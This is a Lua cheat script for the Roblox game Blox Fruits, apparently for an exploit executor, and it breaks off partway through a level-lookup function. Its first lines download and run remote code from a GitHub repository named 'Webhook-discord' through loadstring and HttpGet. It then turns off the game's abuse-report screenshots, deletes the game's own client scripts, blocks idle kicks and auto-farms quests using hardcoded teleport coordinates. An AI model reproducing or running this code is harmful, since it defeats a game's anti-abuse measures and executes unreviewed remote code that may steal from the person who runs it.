-- (**)
_G.AutoDeleteWorkSpace = true
        
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/Webhook-discord/refs/heads/main/l.lua"))()
-- AttackNoCoolDown()
              
local image = [["⬜⬜⬜⬜⬜⬜⬜⬜/n ⬜⬜⬛⬜⬜⬛⬜⬜/n ⬜⬜🟨🟨🟨🟨⬜⬜/n ⬜⬜🟨🟨🟨🟨⬜⬜/n ⬜⬜⬜🟥🟥⬜⬜⬜/n"]]

print(image)

------Fuction
if _G.AutoDeleteWorkSpace then
	if isfolder("a_temp") then
		delfolder("a_temp");
	end
	if isfile("a_temp/268.txt") then
		delfile("a_temp/268.txt");
	end
	if isfile("BF_Kick_Log.txt") then
		delfile("BF_Kick_Log.txt");
	end
	task.wait();
end
if not isfolder("a_temp") then
	makefolder("a_temp");
end
if not isfile("a_temp/268.txt") then
	writefile("a_temp/268.txt", tostring(os.time()));
end

_G.setfflag = true

_G.SafeFarm = true

---+Check band
local id = game.PlaceId
if id==2753915549 then Sea1=true; elseif id==4442272183 then Sea2=true; elseif id==7449423635 then Sea3=true; else game:Shutdown() end;

spawn(function()
    while wait() do
        if _G.setfflag then
            setfflag("AbuseReportScreenshot", "False")
            setfflag("AbuseReportScreenshotPercentage", "0")
        end
    end
end)

spawn(function()
    while wait() do
        if _G.SafeFarm then
            for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                if v:IsA("LocalScript") then
                    if
                        v.Name == "General" or v.Name == "Shiftlock" or v.Name == "FallDamage" or v.Name == "4444" or
                        v.Name == "CamBob" or
                        v.Name == "JumpCD" or
                        v.Name == "Looking" or
                        v.Name == "Run"
                    then
                        v:Destroy()
                    end
                end
            end
            for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
                if v:IsA("LocalScript") then
                    if
                        v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans" or v.Name == "Codes" or
                        v.Name == "CustomForceField" or
                        v.Name == "MenuBloodSp" or
                        v.Name == "PlayerList"
                    then
                        v:Destroy()
                    end
                end
            end
        else
            game.Players.LocalPlayer:Kick("Please don't turn off safe farm if you don't want to get banned")
            game.Players.LocalPlayer:Kick("⬜⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬛⬜⬜⬛⬜⬜\n⬜⬜🟨🟨🟨🟨⬜⬜\n⬜⬜🟨🟨🟨🟨⬜⬜\n⬜⬜⬜🟥🟥⬜⬜⬜\n")
        end
    end
end)

game:GetService("Players").LocalPlayer.Idled:connect(function()
	game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	wait(1)
	game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

Sea1=false
Sea2=false
Sea3=false
local placeId = game.PlaceId
if placeId==2753915549 then
Sea1=true
elseif placeId==4442272183 then
Sea2=true
elseif placeId==7449423635 then
Sea3=true
end

         function MaterialMon()
         if SelectMaterial == "Radioactive Material" then
		   		    MMon = "Factory Staff"
		   		    MPos = CFrame.new(295,73,-56)
		   		    SP = "Default"
			elseif SelectMaterial == "Mystic Droplet" then
		   		    MMon = "Water Fighter"
		   		    MPos = CFrame.new(-3385,239,-10542)
		   		    SP = "Default"
			elseif SelectMaterial == "Magma Ore" then
    			if Sea1 then
		   		    MMon = "Military Spy"
		   		    MPos = CFrame.new(-5815,84,8820)
		   		    SP = "Default"
			elseif Sea2 then
		   		    MMon = "Magma Ninja"
		   		    MPos = CFrame.new(-5428,78,-5959)
		   		    SP = "Default"
				end
			elseif SelectMaterial == "Angel Wings" then
		   		    MMon = "God's Guard"
		   		    MPos = CFrame.new(-4698,845,-1912)
		   		    SP = "Default"
if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-7859.09814, 5544.19043,-381.476196)).Magnitude>=1000000000 then
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7859.09814, 5544.19043,-381.476196))
				end
			elseif SelectMaterial == "Leather" then
    			if Sea1 then
		   		    MMon = "Brute"
		   		    MPos = CFrame.new(-1145,15,4350)
		   		    SP = "Default"
			elseif Sea2 then
		   		    MMon = "Marine Captain"
		   		    MPos = CFrame.new(-2010.5059814453125, 73.00115966796875,-3326.620849609375)
		   		    SP = "Default"
			elseif Sea3 then
		   		    MMon = "Jungle Pirate"
		   		    MPos = CFrame.new(-11975.78515625, 331.7734069824219,-10620.0302734375)
		   		    SP = "Default"
				end
			elseif SelectMaterial == "Scrap Metal" then
    			if Sea1 then
		   		    MMon = "Brute"
		   		    MPos = CFrame.new(-1145,15,4350)
		   		    SP = "Default"
			elseif Sea2 then
		   		    MMon = "Swan Pirate"
		   		    MPos = CFrame.new(878,122,1235)
		   		    SP = "Default"
			elseif Sea3 then
		   		    MMon = "Jungle Pirate"
		   		    MPos = CFrame.new(-12107,332,-10549)
		   		    SP = "Default"
				end
			elseif SelectMaterial == "Fish Tail" then
if Sea3 then
		   		    MMon = "Fishman Raider"
		   		    MPos = CFrame.new(-10993,332,-8940)
		   		    SP = "Default"
			elseif Sea1 then
		   		    MMon = "Fishman Warrior"
		   		    MPos = CFrame.new(61123,19,1569)
		   		    SP = "Default"
if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875)).Magnitude>=1000000000 then
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875))
				end
				end
			elseif SelectMaterial == "Demonic Wisp" then
		   		    MMon = "Demonic Soul"
		   		    MPos = CFrame.new(-9507,172,6158)
		   		    SP = "Default"
			elseif SelectMaterial == "Vampire Fang" then
		   		    MMon = "Vampire"
		   		    MPos = CFrame.new(-6033,7,-1317)
		   		    SP = "Default"
			elseif SelectMaterial == "Conjured Cocoa" then
		   		    MMon = "Chocolate Bar Battler"
		   		    MPos = CFrame.new(620.6344604492188,78.93644714355469,-12581.369140625)
		   		    SP = "Default"
			elseif SelectMaterial == "Dragon Scale" then
		   		    MMon = "Dragon Crew Archer"
		   		    MPos = CFrame.new(6827.91455078125, 609.4127197265625, 252.3538055419922)
		   		    SP = "Default"
			elseif SelectMaterial == "Gunpowder" then
		   		    MMon = "Pistol Billionaire"
		   		    MPos = CFrame.new(-469,74,5904)
		   		    SP = "Default"
			elseif SelectMaterial == "Mini Tusk" then
		   		    MMon = "Mythological Pirate"
		   		    MPos = CFrame.new()
		   		    SP = "Default"
			     end
		    end

     function CheckLevel()
        Lv = game:GetService("Players").LocalPlayer.Data.Level.Value
        if Sea1 then
            if Lv >= 1 and Lv <= 9 or SelectMonster == "Bandit" then
                Ms = "Bandit"
                QuestLv = 1
                NameQuest = "BanditQuest1"
                NameMon = "Bandit"
                CFrameQ = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
                CFrameMon = CFrame.new(1045.962646484375, 27.00250816345215, 1560.8203125)              
            elseif Lv >= 10 and Lv <= 14 or SelectMonster == "Monkey" then
                Ms = "Monkey"
                QuestLv = 1
                NameQuest = "JungleQuest"
                NameMon = "Monkey"
                CFrameQ = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-1448.51806640625, 67.85301208496094, 11.46579647064209)                                
            elseif Lv >= 15 and Lv <= 29 or SelectMonster == "Gorilla" then
                Ms = "Gorilla"
                QuestLv = 2
                NameQuest = "JungleQuest"
                NameMon = "Gorilla"
                CFrameQ = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-1129.8836669921875, 40.46354675292969, -525.4237060546875)                
            elseif Lv >= 30 and Lv <= 39 or SelectMonster == "Pirate" then
                Ms = "Pirate"
                QuestLv = 1
                NameQuest = "BuggyQuest1"
                NameMon = "Pirate"
                CFrameQ = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-1103.513427734375, 13.752052307128906, 3896.091064453125)                
            elseif Lv >= 40 and Lv <= 59 or SelectMonster == "Brute" then
                Ms = "Brute"
                QuestLv = 2
                NameQuest = "BuggyQuest1"
                NameMon = "Brute"
                CFrameQ = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-1140.083740234375, 14.809885025024414, 4322.92138671875)
            elseif Lv >= 60 and Lv <= 74 or SelectMonster == "Desert Bandit" then
                Ms = "Desert Bandit"
                QuestLv = 1
                NameQuest = "DesertQuest"
                NameMon = "Desert Bandit"
                CFrameQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                CFrameMon = CFrame.new(924.7998046875, 6.44867467880249, 4481.5859375)            
            elseif Lv >= 75 and Lv <= 89 or SelectMonster == "Desert Officer" then
                Ms = "Desert Officer"
                QuestLv = 2
                NameQuest = "DesertQuest"
                NameMon = "Desert Officer"
                CFrameQ = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                CFrameMon = CFrame.new(1608.2822265625, 8.614224433898926, 4371.00732421875)               
            elseif Lv >= 90 and Lv <= 99 or SelectMonster == "Snow Bandit" then
                Ms = "Snow Bandit"
                QuestLv = 1
                NameQuest = "SnowQuest"
                NameMon = "Snow Bandit"
                CFrameQ = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                CFrameMon = CFrame.new(1354.347900390625, 87.27277374267578, -1393.946533203125)
                
            elseif Lv >= 100 and Lv <= 119 or SelectMonster == "Snowman" then
                Ms = "Snowman"
                QuestLv = 2
                NameQuest = "SnowQuest"
                NameMon = "Snowman"
                CFrameQ = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                CFrameMon = CFrame.new(1201.6412353515625, 144.57958984375, -1550.0670166015625)
            elseif Lv >= 120 and Lv <= 149 or SelectMonster == "Chief Petty Officer" then
                Ms = "Chief Petty Officer"
                QuestLv = 1
                NameQuest = "MarineQuest2"
                NameMon = "Chief Petty Officer"
                CFrameQ = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-4881.23095703125, 22.65204429626465, 4273.75244140625)
            elseif Lv >= 150 and Lv <= 174 or SelectMonster == "Sky Bandit" then
                Ms = "Sky Bandit"
                QuestLv = 1
                NameQuest = "SkyQuest"
                NameMon = "Sky Bandit"
                CFrameQ = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-4953.20703125, 295.74420166015625, -2899.22900390625)
                
            elseif Lv >= 175 and Lv <= 189 or SelectMonster == "Dark Master" then
                Ms = "Dark Master"
                QuestLv = 2
                NameQuest = "SkyQuest"
                NameMon = "Dark Master"
                CFrameQ = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-5259.8447265625, 391.3976745605469, -2229.035400390625)
            elseif Lv >= 190 and Lv <= 209 or SelectMonster == "Prisoner" then
                Ms = "Prisoner"
                QuestLv = 1
                NameQuest = "PrisonerQuest"
                NameMon = "Prisoner"
                CFrameQ = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                CFrameMon = CFrame.new(5098.9736328125, -0.3204058110713959, 474.2373352050781)
            elseif Lv >= 210 and Lv <= 249 or SelectMonster == "Dangerous Prisone" then
                Ms = "Dangerous Prisoner"
                QuestLv = 2
                NameQuest = "PrisonerQuest"
                NameMon = "Dangerous Prisoner"
                CFrameQ = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                CFrameMon = CFrame.new(5654.5634765625, 15.633401870727539, 866.2991943359375)
            elseif Lv >= 250 and Lv <= 274 or SelectMonster == "Toga Warrior" then
                Ms = "Toga Warrior"
                QuestLv = 1
                NameQuest = "ColosseumQuest"
                NameMon = "Toga Warrior"
                CFrameQ = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                CFrameMon = CFrame.new(-1820.21484375, 51.68385696411133, -2740.6650390625)
            elseif Lv >= 275 and Lv <= 299 or SelectMonster == "Gladiator" then
                Ms = "Gladiator"
                QuestLv = 2
                NameQuest = "ColosseumQuest"
                NameMon = "Gladiator"
                CFrameQ = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                CFrameMon = CFrame.new(-1292.838134765625, 56.380882263183594, -3339.031494140625)
            elseif Lv >= 300 and Lv <= 324 or SelectMonster == "Military Soldier" then
                Ms = "Military Soldier"
                QuestLv = 1
                NameQuest = "MagmaQuest"
                NameMon = "Military Soldier"
                CFrameQ = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                CFrameMon = CFrame.new(-5411.16455078125, 11.081554412841797, 8454.29296875)
            elseif Lv >= 325 and Lv <= 374 or SelectMonster == "Military Spy" then
                Ms = "Military Spy"
                QuestLv = 2
                NameQuest = "MagmaQuest"
                NameMon = "Military Spy"
                CFrameQ = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                CFrameMon = CFrame.new(-5802.8681640625, 86.26241302490234, 8828.859375)
            elseif Lv >= 375 and Lv <= 399 or SelectMonster == "Fishman Warrior" then
                Ms = "Fishman Warrior"
                QuestLv = 1
                NameQuest = "FishmanQuest"
                NameMon = "Fishman Warrior"
                CFrameQ = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                CFrameMon = CFrame.new(60878.30078125, 18.482830047607422, 1543.7574462890625)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                end
            elseif Lv >= 400 and Lv <= 449 or SelectMonster == "Fishman Commando" then
                Ms = "Fishman Commando"
                QuestLv = 2
                NameQuest = "FishmanQuest"
                NameMon = "Fishman Commando"
                CFrameQ = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                CFrameMon = CFrame.new(61922.6328125, 18.482830047607422, 1493.934326171875)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                end
            elseif Lv >= 450 and Lv <= 474 or SelectMonster == "God's Guard" then
                Ms = "God's Guard"
                QuestLv = 1
                NameQuest = "SkyExp1Quest"
                NameMon = "God's Guard"
                CFrameQ = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, -0, -0.0871884301, 0, 1, -0, 0.0871884301, 0, 0.996191859)
                CFrameMon = CFrame.new(-4710.04296875, 845.2769775390625, -1927.3079833984375)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                end
            elseif Lv >= 475 and Lv <= 524 or SelectMonster == "Shanda" then
                Ms = "Shanda"
                QuestLv = 2
                NameQuest = "SkyExp1Quest"
                NameMon = "Shanda"
                CFrameQ = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                CFrameMon = CFrame.new(-7678.48974609375, 5566.40380859375, -497.2156066894531)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
                end
            elseif Lv >= 525 and Lv <= 549 or SelectMonster == "Royal Squad" then
                Ms = "Royal Squad"
                QuestLv = 1
                NameQuest = "SkyExp2Quest"
                NameMon = "Royal Squad"
                CFrameQ = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-7624.25244140625, 5658.13330078125, -1467.354248046875)
            elseif Lv >= 550 and Lv <= 624 or SelectMonster == "Royal Soldier" then
                Ms = "Royal Soldier"
                QuestLv = 2
                NameQuest = "SkyExp2Quest"
                NameMon = "Royal Soldier"
                CFrameQ = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-7836.75341796875, 5645.6640625, -1790.6236572265625)
            elseif Lv >= 625 and Lv <= 649 or SelectMonster == "Galley Pirate" then
                Ms = "Galley Pirate"
                QuestLv = 1
                NameQuest = "FountainQuest"
                NameMon = "Galley Pirate"
                CFrameQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                CFrameMon = CFrame.new(5551.02197265625, 78.90135192871094, 3930.412841796875)
            elseif Lv >= 650 or SelectMonster == "Galley Captain" then
                Ms = "Galley Captain"
                QuestLv = 2
                NameQuest = "FountainQuest"
                NameMon = "Galley Captain"
                CFrameQ = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                CFrameMon = CFrame.new(5441.95166015625, 42.50205993652344, 4950.09375)
            end
           elseif Sea2 then
            if Lv >= 700 and Lv <= 724 or SelectMonster == "Raider" then
                Ms = "Raider"
                QuestLv = 1
                NameQuest = "Area1Quest"
                NameMon = "Raider"
                CFrameQ = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                CFrameMon = CFrame.new(-728.3267211914062, 52.779319763183594, 2345.7705078125)
            elseif Lv >= 725 and Lv <= 774 or SelectMonster == "Mercenary" then
                Ms = "Mercenary"
                QuestLv = 2
                NameQuest = "Area1Quest"
                NameMon = "Mercenary"
                CFrameQ = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                CFrameMon = CFrame.new(-1004.3244018554688, 80.15886688232422, 1424.619384765625)
            elseif Lv >= 775 and Lv <= 799 or SelectMonster == "Swan Pirate" then
                Ms = "Swan Pirate"
                QuestLv = 1
                NameQuest = "Area2Quest"
                NameMon = "Swan Pirate"
                CFrameQ = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                CFrameMon = CFrame.new(1068.664306640625, 137.61428833007812, 1322.1060791015625)
            elseif Lv >= 800 and Lv <= 874 or SelectMonster == "Factory Staff" then
                Ms = "Factory Staff"
                NameQuest = "Area2Quest"
                QuestLv = 2
                NameMon = "Factory Staff"
                CFrameQ = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
                CFrameMon = CFrame.new(73.07867431640625, 81.86344146728516, -27.470672607421875)
            elseif Lv >= 875 and Lv <= 899 or SelectMonster == "Marine Lieutenant" then           
                Ms = "Marine Lieutenant"
                QuestLv = 1
                NameQuest = "MarineQuest3"
                NameMon = "Marine Lieutenant"
                CFrameQ = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-2821.372314453125, 75.89727783203125, -3070.089111328125)
            elseif Lv >= 900 and Lv <= 949 or SelectMonster == "Marine Captain" then
                Ms = "Marine Captain"
                QuestLv = 2
                NameQuest = "MarineQuest3"
                NameMon = "Marine Captain"
                CFrameQ = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-1861.2310791015625, 80.17658233642578, -3254.697509765625)
            elseif Lv >= 950 and Lv <= 974 or SelectMonster == "Zombie" then
                Ms = "Zombie"
                QuestLv = 1
                NameQuest = "ZombieQuest"
                NameMon = "Zombie"
                CFrameQ = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                CFrameMon = CFrame.new(-5657.77685546875, 78.96973419189453, -928.68701171875)
            elseif Lv >= 975 and Lv <= 999 or SelectMonster == "Vampire" then
                Ms = "Vampire"
                QuestLv = 2
                NameQuest = "ZombieQuest"
                NameMon = "Vampire"
                CFrameQ = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                CFrameMon = CFrame.new(-6037.66796875, 32.18463897705078, -1340.6597900390625)
            elseif Lv >= 1000 and Lv <= 1049 or SelectMonster == "Snow Trooper" then
                Ms = "Snow Trooper"
                QuestLv = 1
                NameQuest = "SnowMountainQuest"
                NameMon = "Snow Trooper"
                CFrameQ = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                CFrameMon = CFrame.new(549.1473388671875, 427.3870544433594, -5563.69873046875)
            elseif Lv >= 1050 and Lv <= 1099 or SelectMonster == "Winter Warrior" then
                Ms = "Winter Warrior"
                QuestLv = 2
                NameQuest = "SnowMountainQuest"
                NameMon = "Winter Warrior"
                CFrameQ = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                CFrameMon = CFrame.new(1142.7451171875, 475.6398010253906, -5199.41650390625)
            elseif Lv >= 1100 and Lv <= 1124 or SelectMonster == "Lab Subordinate" then
                Ms = "Lab Subordinate"
                QuestLv = 1
                NameQuest = "IceSideQuest"
                NameMon = "Lab Subordinate"
                CFrameQ = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                CFrameMon = CFrame.new(-5707.4716796875, 15.951709747314453, -4513.39208984375)
            elseif Lv >= 1125 and Lv <= 1174 or SelectMonster == "Horned Warrior" then
                Ms = "Horned Warrior"
                QuestLv = 2
                NameQuest = "IceSideQuest"
                NameMon = "Horned Warrior"
                CFrameQ = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                CFrameMon = CFrame.new(-6341.36669921875, 15.951770782470703, -5723.162109375)
            elseif Lv >= 1175 and Lv <= 1199 or SelectMonster == "Magma Ninja" then
                Ms = "Magma Ninja"
                QuestLv = 1
                NameQuest = "FireSideQuest"
                NameMon = "Magma Ninja"
                CFrameQ = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                CFrameMon = CFrame.new(-5449.6728515625, 76.65874481201172, -5808.20068359375)
            elseif Lv >= 1200 and Lv <= 1249 or SelectMonster == "Lava Pirate" then
                Ms = "Lava Pirate"
                QuestLv = 2
                NameQuest = "FireSideQuest"
                NameMon = "Lava Pirate"
                CFrameQ = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                CFrameMon = CFrame.new(-5213.33154296875, 49.73788070678711, -4701.451171875)
            elseif Lv >= 1250 and Lv <= 1274 or SelectMonster == "Ship Deckhand" then
                Ms = "Ship Deckhand"
                QuestLv = 1
                NameQuest = "ShipQuest1"
                NameMon = "Ship Deckhand"
                CFrameQ = CFrame.new(1037.80127, 125.092171, 32911.6016)         
                CFrameMon = CFrame.new(1212.0111083984375, 150.79205322265625, 33059.24609375)    
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif Lv >= 1275 and Lv <= 1299 or SelectMonster == "Ship Engineer" then
                Ms = "Ship Engineer"
                QuestLv = 2
                NameQuest = "ShipQuest1"
                NameMon = "Ship Engineer"
                CFrameQ = CFrame.new(1037.80127, 125.092171, 32911.6016)   
                CFrameMon = CFrame.new(919.4786376953125, 43.54401397705078, 32779.96875)   
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end             
            elseif Lv >= 1300 and Lv <= 1324 or SelectMonster == "Ship Steward" then
                Ms = "Ship Steward"
                QuestLv = 1
                NameQuest = "ShipQuest2"
                NameMon = "Ship Steward"
                CFrameQ = CFrame.new(968.80957, 125.092171, 33244.125)         
                CFrameMon = CFrame.new(919.4385375976562, 129.55599975585938, 33436.03515625)      
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif Lv >= 1325 and Lv <= 1349 or SelectMonster == "Ship Officer" then
                Ms = "Ship Officer"
                QuestLv = 2
                NameQuest = "ShipQuest2"
                NameMon = "Ship Officer"
                CFrameQ = CFrame.new(968.80957, 125.092171, 33244.125)
                CFrameMon = CFrame.new(1036.0179443359375, 181.4390411376953, 33315.7265625)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif Lv >= 1350 and Lv <= 1374 or SelectMonster == "Arctic Warrior" then
                Ms = "Arctic Warrior"
                QuestLv = 1
                NameQuest = "FrostQuest"
                NameMon = "Arctic Warrior"
                CFrameQ = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                CFrameMon = CFrame.new(5966.24609375, 62.97002029418945, -6179.3828125)
                if _G.AutoLevel and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-6508.5581054688, 5000.034996032715, -132.83953857422))
                end
            elseif Lv >= 1375 and Lv <= 1424 or SelectMonster == "Snow Lurker" then
                Ms = "Snow Lurker"
                QuestLv = 2
                NameQuest = "FrostQuest"
                NameMon = "Snow Lurker"
                CFrameQ = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                CFrameMon = CFrame.new(5407.07373046875, 69.19437408447266, -6880.88037109375)
            elseif Lv >= 1425 and Lv <= 1449 or SelectMonster == "Sea Soldier" then
                Ms = "Sea Soldier"
                QuestLv = 1
                NameQuest = "ForgottenQuest"
                NameMon = "Sea Soldier"
                CFrameQ = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                CFrameMon = CFrame.new(-3028.2236328125, 64.67451477050781, -9775.4267578125)
            elseif Lv >= 1450 or SelectMonster == "Water Fighter" then
                Ms = "Water Fighter"
                QuestLv = 2
                NameQuest = "ForgottenQuest"
                NameMon = "Water Fighter"
                CFrameQ = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                CFrameMon = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875)
            end
                elseif Sea3 then
           if Lv >= 1500 and Lv <= 1524 or SelectMonster == "Pirate Millionaire" then
                Ms = "Pirate Millionaire"
                QuestLv = 1
                NameQuest = "PiratePortQuest"
                NameMon = "Pirate Millionaire"
